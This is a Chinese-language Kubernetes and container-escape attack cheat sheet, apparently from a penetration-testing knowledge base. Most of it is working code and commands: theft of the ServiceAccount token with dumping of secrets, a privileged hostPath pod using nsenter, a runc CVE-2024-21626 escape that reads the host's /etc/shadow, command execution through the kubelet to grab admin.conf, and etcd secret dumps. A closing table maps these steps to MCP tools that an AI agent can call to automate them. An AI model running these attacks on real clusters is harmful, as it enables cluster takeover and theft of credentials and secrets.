# Kubernetes & 容器逃逸

## Service Account Token 劫持

```python
# 从 Pod 内窃取 SA token → 操作 K8s API
import requests, os

def exploit_sa_token():
    """Pod 内提取并滥用 ServiceAccount token"""
    TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read()
    CA = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    API = "https://kubernetes.default.svc"

    # Step 1: 枚举权限
    r = requests.get(f"{API}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
        verify=CA, headers={"Authorization": f"Bearer {TOKEN}"})
    print(f"Auth: {r.status_code}")

    # Step 2: List Pods (如果 RBAC 允许)
    r = requests.get(f"{API}/api/v1/namespaces/default/pods",
        verify=CA, headers={"Authorization": f"Bearer {TOKEN}"})
    for pod in r.json().get("items", []):
        print(f"  Pod: {pod['metadata']['name']}")

    # Step 3: 读 secrets (如果 RBAC 允许)
    r = requests.get(f"{API}/api/v1/namespaces/default/secrets",
        verify=CA, headers={"Authorization": f"Bearer {TOKEN}"})
    for s in r.json().get("items", []):
        print(f"  Secret: {s['metadata']['name']}")
        for k, v in s.get("data", {}).items():
            import base64
            decoded = base64.b64decode(v).decode()
            if len(decoded) < 200:
                print(f"    {k}: {decoded}")

    return TOKEN

# 常见权限: pods:list, pods:exec, pods:create, secrets:get, deployments:create
```

## RBAC → Privileged Pod 逃逸

```python
# 如果有 pods:create → 创建 privileged pod 挂载 hostPath
PRIVILEGED_POD = {
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "escape-pod"},
    "spec": {
        "containers": [{
            "name": "escape",
            "image": "alpine",
            "command": ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -- /bin/sh -c 'echo pwned > /tmp/escape_proof'"],
            "securityContext": {"privileged": True},
            "volumeMounts": [{"name": "host", "mountPath": "/host"}]
        }],
        "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
        "restartPolicy": "Never"
    }
}

def create_escape_pod(api, token, ca):
    r = requests.post(f"{api}/api/v1/namespaces/default/pods",
        verify=ca, headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }, json=PRIVILEGED_POD)
    return r.status_code == 201
```

## runc 逃逸 (CVE-2024-21626)

```python
# CVE-2024-21626: runc 未正确关闭内部 fd
# → /proc/self/fd/ 可访问 host 文件系统
# 从容器内:
def exploit_runc_fd_leak():
    """容器内 runc fd leak 逃逸"""
    import os

    # Step 1: 列出 /proc/self/fd
    for fd in os.listdir("/proc/self/fd/"):
        try:
            target = os.readlink(f"/proc/self/fd/{fd}")
            if target.startswith("/") and not target.startswith("/proc"):
                print(f"[!] Host fd: {fd} → {target}")
                # Step 2: chdir 到 host 路径
                os.chdir(f"/proc/self/fd/{fd}")
                # Step 3: 现在是 host 文件系统
                with open("/etc/shadow", "r") as f:
                    print(f.read()[:100])  # 宿主机的 shadow!
        except: pass
```

## kubelet API 直接访问

```bash
# kubelet 监听 10250 (无认证或弱认证)
# 从 Pod 内打到 node 的 kubelet:

# 枚举 pods
curl -k https://NODE_IP:10250/pods

# 在任意 pod 内执行命令
curl -k https://NODE_IP:10250/run/default/EXISTING_POD/CONTAINER \
  -d "cmd=cat /etc/kubernetes/admin.conf"

# 拿到 admin.conf → 完整集群控制
```

## etcd 直接访问 (端口 2379)

```bash
# 如果 etcd 可从 Pod 内访问 (网络策略缺失)
etcdctl --endpoints=https://ETCD_IP:2379 \
  --cert="" --key="" --cacert="" \
  get /registry/secrets --prefix --keys-only

# etcd 存所有 K8s 对象: secrets, configmaps, service accounts
# 读 etcd = 完整集群数据
```

## 攻击链

```
Pod 内 RCE → SA token 读取 → RBAC 枚举 → privileged pod 创建 → hostPath 挂载 → 宿主机 RCE
Pod 内 RCE → kubelet API (10250) → 在已有 pod 执行命令 → 窃取其他 SA token
Pod 内 RCE → etcd (2379) → 读取 secrets → DB 密码/API key
Pod 内 RCE → runc CVE-2024-21626 → fd leak → host 文件系统读写 → 容器逃逸
Node 访问 → cloud metadata (169.254.169.254) → IAM role → 云账户接管
```

## Evidence

记录: SA token (前20字符)、RBAC selfsubjectaccessreview 结果、pods/secrets 列表、逃逸证明文件

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| K8s/容器端点探测 | `http_probe` | HTTP GET 探测 Kubernetes API/容器入口 |
| 知识检索 | `kb_router` | 按 K8s/容器攻击信号搜索知识库 |
